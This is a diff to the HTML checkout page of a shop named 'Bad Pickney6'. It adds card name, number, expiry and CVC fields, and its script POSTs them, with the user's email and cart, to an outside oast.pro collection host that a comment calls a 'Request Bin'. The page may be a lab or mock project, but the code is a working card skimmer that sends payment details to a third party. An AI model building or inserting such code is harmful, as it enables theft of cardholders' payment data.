@@ -1,97 +1,155 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Checkout - Bad Pickney6</title>
-<link rel="stylesheet" href="styles.css" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Checkout - Bad Pickney6</title>
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    /* Checkout-specific styles */
+    #checkoutContainer {
+      max-width: 600px;
+      margin: 40px auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
+    }
+
+    #checkoutContainer h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #0077cc;
+    }
+
+    #cartItems {
+      list-style: none;
+      padding: 0;
+      margin-bottom: 20px;
+    }
+
+    #cartItems li {
+      margin-bottom: 10px;
+      font-size: 1rem;
+    }
+
+    #totalPrice {
+      font-weight: bold;
+      margin-bottom: 20px;
+      text-align: right;
+    }
+
+    #cardForm input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 1rem;
+    }
+
+    #checkoutBtn {
+      width: 100%;
+      padding: 15px;
+      background: #28a745;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 1.1rem;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    #checkoutBtn:hover {
+      background: #218838;
+    }
+  </style>
 </head>
 <body>
-
-<header>
-  <div class="container">
-    <div class="logo">
-      <img src="assets/images/bank-robber.png" alt="Bank Robber Logo" />
-      <h1>Bad Pickney6</h1>
-    </div>
-    <nav>
-      <ul>
-        <li><a href="index.html">Home</a></li>
-        <li><a href="shop.html">Shop</a></li>
-      </ul>
-    </nav>
-  </div>
-</header>
-
-<section id="checkout" class="section">
-  <div class="container">
+  <div id="checkoutContainer">
     <h2>Checkout</h2>
-    <div id="cartContainer">
-      <ul id="cartItems"></ul>
-      <p id="totalPrice">Total: $0</p>
+
+    <ul id="cartItems"></ul>
+    <p id="totalPrice">Total: $0</p>
+
+    <div id="cardForm">
+      <input type="text" id="cardName" placeholder="Name on Card" required>
+      <input type="text" id="cardNumber" placeholder="Card Number" required>
+      <input type="text" id="cardExpiry" placeholder="MM/YY" required>
+      <input type="text" id="cardCVC" placeholder="CVC" required>
       <button id="checkoutBtn">Confirm Purchase</button>
     </div>
   </div>
-</section>
 
-<footer>
-  <div class="container">
-    <p>&copy; 2025 Bad Pickney6. All rights reserved.</p>
-  </div>
-</footer>
+  <script>
+    // Redirect if not logged in
+    const loggedInUser = JSON.parse(localStorage.getItem('loggedInUser'));
+    if (!loggedInUser) {
+      alert("You must be logged in to access checkout!");
+      window.location.href = "index.html";
+    }
 
-<script>
-// Only logged-in users
-const loggedInUser = JSON.parse(localStorage.getItem('loggedInUser'));
-if (!loggedInUser) {
-  alert("You must be logged in to access checkout.");
-  window.location.href = 'index.html';
-}
+    // Load cart from localStorage
+    let cart = JSON.parse(localStorage.getItem('cart') || '[]');
 
-// Load cart from localStorage
-let cart = JSON.parse(localStorage.getItem('cart') || '[]');
-const cartItemsEl = document.getElementById('cartItems');
-const totalPriceEl = document.getElementById('totalPrice');
+    const cartItemsEl = document.getElementById('cartItems');
+    const totalPriceEl = document.getElementById('totalPrice');
 
-function updateCartDisplay() {
-  cartItemsEl.innerHTML = '';
-  let total = 0;
-  cart.forEach(item => {
-    const li = document.createElement('li');
-    li.textContent = `${item.name} - $${item.price}`;
-    cartItemsEl.appendChild(li);
-    total += item.price;
-  });
-  totalPriceEl.textContent = `Total: $${total}`;
-}
+    function updateCartDisplay() {
+      cartItemsEl.innerHTML = '';
+      let total = 0;
+      cart.forEach(item => {
+        const li = document.createElement('li');
+        li.textContent = `${item.name} - $${item.price}`;
+        cartItemsEl.appendChild(li);
+        total += item.price;
+      });
+      totalPriceEl.textContent = `Total: $${total.toFixed(2)}`;
+    }
 
-updateCartDisplay();
-
-// Checkout - send to Request Bin
-document.getElementById('checkoutBtn').addEventListener('click', () => {
-  if (cart.length === 0) return alert("Your cart is empty!");
-
-  fetch('https://6dc777f83b840b1f739bg1ftg9ayyyyyb.oast.pro', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      user: loggedInUser.email,
-      cart: cart,
-      total: cart.reduce((sum, item) => sum + item.price, 0)
-    })
-  })
-  .then(() => {
-    alert("Checkout data sent successfully!");
-    cart = [];
-    localStorage.setItem('cart', JSON.stringify(cart));
     updateCartDisplay();
-  })
-  .catch(err => {
-    console.error(err);
-    alert("Failed to send checkout data.");
-  });
-});
-</script>
 
+    // Checkout button sends cart + card info to Request Bin
+    document.getElementById('checkoutBtn').addEventListener('click', () => {
+      const cardName = document.getElementById('cardName').value.trim();
+      const cardNumber = document.getElementById('cardNumber').value.trim();
+      const cardExpiry = document.getElementById('cardExpiry').value.trim();
+      const cardCVC = document.getElementById('cardCVC').value.trim();
+
+      if (!cardName || !cardNumber || !cardExpiry || !cardCVC) {
+        return alert("Please fill in all card details.");
+      }
+
+      if (cart.length === 0) return alert("Your cart is empty!");
+
+      fetch('https://6dc777f83b840b1f739bg1ftg9ayyyyyb.oast.pro', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          user: loggedInUser.email,
+          cart: cart,
+          total: cart.reduce((sum, item) => sum + item.price, 0),
+          card: {
+            name: cardName,
+            number: cardNumber,
+            expiry: cardExpiry,
+            cvc: cardCVC
+          }
+        })
+      })
+      .then(() => {
+        alert("Checkout data sent successfully!");
+        cart = [];
+        localStorage.setItem('cart', JSON.stringify(cart));
+        updateCartDisplay();
+        document.getElementById('cardForm').reset();
+      })
+      .catch(err => {
+        console.error(err);
+        alert("Failed to send checkout data.");
+      });
+    });
+  </script>
 </body>
 </html>
